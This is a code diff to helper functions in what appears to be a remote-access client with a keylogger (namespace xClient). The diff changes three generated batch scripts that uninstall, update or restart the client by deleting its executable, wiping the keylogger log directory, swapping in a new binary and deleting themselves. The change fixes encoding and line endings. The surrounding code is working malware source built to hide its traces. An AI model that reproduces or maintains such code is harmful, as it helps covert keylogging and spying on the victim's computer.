@@ -54,14 +54,15 @@ namespace xClient.Core.Helper
                 string batchFile = GetTempFilePath(".bat");
 
                 string uninstallBatch =
-                    "@echo off" + "\n" +
-                    "echo DONT CLOSE THIS WINDOW!" + "\n" +
-                    "ping -n 10 localhost > nul" + "\n" +
-                    "del /a /q /f " + "\"" + ClientData.CurrentPath + "\"" + "\n" +
-                    "rmdir /q /s " + "\"" + Keylogger.LogDirectory + "\"" + "\n" +
+                    "@echo off" + "\r\n" +
+                    "chcp 65001" + "\r\n" +
+                    "echo DONT CLOSE THIS WINDOW!" + "\r\n" +
+                    "ping -n 10 localhost > nul" + "\r\n" +
+                    "del /a /q /f " + "\"" + ClientData.CurrentPath + "\"" + "\r\n" +
+                    "rmdir /q /s " + "\"" + Keylogger.LogDirectory + "\"" + "\r\n" +
                     "del /a /q /f " + "\"" + batchFile + "\"";
 
-                File.WriteAllText(batchFile, uninstallBatch);
+                File.WriteAllText(batchFile, uninstallBatch, new UTF8Encoding(false));
                 return batchFile;
             }
             catch (Exception)
@@ -77,15 +78,16 @@ namespace xClient.Core.Helper
                 string batchFile = GetTempFilePath(".bat");
 
                 string updateBatch =
-                    "@echo off" + "\n" +
-                    "echo DONT CLOSE THIS WINDOW!" + "\n" +
-                    "ping -n 10 localhost > nul" + "\n" +
-                    "del /a /q /f " + "\"" + ClientData.CurrentPath + "\"" + "\n" +
-                    "move /y " + "\"" + newFilePath + "\"" + " " + "\"" + ClientData.CurrentPath + "\"" + "\n" +
-                    "start \"\" " + "\"" + ClientData.CurrentPath + "\"" + "\n" +
+                    "@echo off" + "\r\n" +
+                    "chcp 65001" + "\r\n" +
+                    "echo DONT CLOSE THIS WINDOW!" + "\r\n" +
+                    "ping -n 10 localhost > nul" + "\r\n" +
+                    "del /a /q /f " + "\"" + ClientData.CurrentPath + "\"" + "\r\n" +
+                    "move /y " + "\"" + newFilePath + "\"" + " " + "\"" + ClientData.CurrentPath + "\"" + "\r\n" +
+                    "start \"\" " + "\"" + ClientData.CurrentPath + "\"" + "\r\n" +
                     "del /a /q /f " + "\"" + batchFile + "\"";
 
-                File.WriteAllText(batchFile, updateBatch);
+                File.WriteAllText(batchFile, updateBatch, new UTF8Encoding(false));
                 return batchFile;
             }
             catch (Exception)
@@ -101,13 +103,14 @@ namespace xClient.Core.Helper
                 string batchFile = GetTempFilePath(".bat");
 
                 string restartBatch =
-                    "@echo off" + "\n" +
-                    "echo DONT CLOSE THIS WINDOW!" + "\n" +
-                    "ping -n 10 localhost > nul" + "\n" +
-                    "start \"\" " + "\"" + ClientData.CurrentPath + "\"" + "\n" +
+                    "@echo off" + "\r\n" +
+                    "chcp 65001" + "\r\n" +
+                    "echo DONT CLOSE THIS WINDOW!" + "\r\n" +
+                    "ping -n 10 localhost > nul" + "\r\n" +
+                    "start \"\" " + "\"" + ClientData.CurrentPath + "\"" + "\r\n" +
                     "del /a /q /f " + "\"" + batchFile + "\"";
 
-                File.WriteAllText(batchFile, restartBatch);
+                File.WriteAllText(batchFile, restartBatch, new UTF8Encoding(false));
 
                 return batchFile;
             }
